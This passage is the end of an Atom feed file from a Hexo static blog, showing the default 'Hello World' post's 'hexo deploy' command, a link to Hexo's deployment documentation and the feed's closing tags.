class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Hello World&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
